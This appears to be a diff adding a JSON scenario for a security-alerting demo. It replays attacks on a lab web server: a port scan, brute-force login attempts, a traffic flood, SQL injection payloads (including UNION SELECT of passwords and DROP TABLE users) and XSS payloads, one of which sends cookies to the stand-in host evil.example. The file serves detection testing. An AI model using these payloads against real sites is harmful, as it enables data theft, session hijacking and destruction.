@@ -1,0 +1,76 @@
+{
+  "name": "IncidentPilot demo - small office web server under attack",
+  "web_server": "192.168.56.104",
+  "history": [
+    {
+      "comment": "Yesterday: IT's authorized weekly Nmap scan. Analyst dismissed it as a false positive -> Pilot learns from this.",
+      "source_ip": "192.168.56.5",
+      "hours_ago": 26,
+      "alerts": [
+        {
+          "attack_type": "Port Scan",
+          "target_port": 22,
+          "severity": "Medium",
+          "description": "The source IP accessed 12 different ports in 5 seconds (threshold 5). Ports: 21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3306, 8080."
+        }
+      ],
+      "analyst_decision": "dismissed",
+      "analyst": "it-admin",
+      "notes": "Authorized weekly vulnerability scan by the IT team (Nessus/Nmap box). Expected every week."
+    }
+  ],
+  "steps": [
+    {
+      "comment": "Attacker 1 - reconnaissance: fast port scan of the web server",
+      "type": "traffic",
+      "src": "192.168.56.10",
+      "ports": [21, 22, 23, 25, 80, 443, 3306, 8080]
+    },
+    { "type": "pause", "seconds": 1 },
+    {
+      "comment": "Attacker 1 - exploitation: SQL injection on the login and product pages",
+      "type": "traffic",
+      "src": "192.168.56.10",
+      "ports": [80],
+      "payloads": [
+        "GET /login?user=admin' OR '1'='1&pass=x HTTP/1.1",
+        "GET /products?id=1 UNION SELECT username,password FROM users HTTP/1.1",
+        "GET /products?id=1; DROP TABLE users-- HTTP/1.1"
+      ]
+    },
+    { "type": "pause", "seconds": 1 },
+    {
+      "comment": "Attacker 2 - XSS attempts on the search page",
+      "type": "traffic",
+      "src": "192.168.56.23",
+      "ports": [80],
+      "payloads": [
+        "GET /search?q=<script>document.location='http://evil.example/?c='+document.cookie</script> HTTP/1.1",
+        "GET /search?q=<img src=x onerror=alert(1)> HTTP/1.1",
+        "GET /search?q=<iframe src=javascript:alert(document.domain)> HTTP/1.1"
+      ]
+    },
+    { "type": "pause", "seconds": 1 },
+    {
+      "comment": "IT scanner again - same as yesterday's dismissed false positive",
+      "type": "traffic",
+      "src": "192.168.56.5",
+      "ports": [21, 22, 23, 25, 53, 80, 110, 143, 443, 445]
+    },
+    { "type": "pause", "seconds": 1 },
+    {
+      "comment": "Attacker 3 - password guessing on the IncidentPilot dashboard login",
+      "type": "brute_force",
+      "src": "192.168.56.77",
+      "attempts": 6
+    },
+    { "type": "pause", "seconds": 1 },
+    {
+      "comment": "Unknown host - traffic spike (could be a flood or a misbehaving backup job)",
+      "type": "flood",
+      "src": "192.168.56.40",
+      "port": 80,
+      "packets": 60
+    }
+  ]
+}
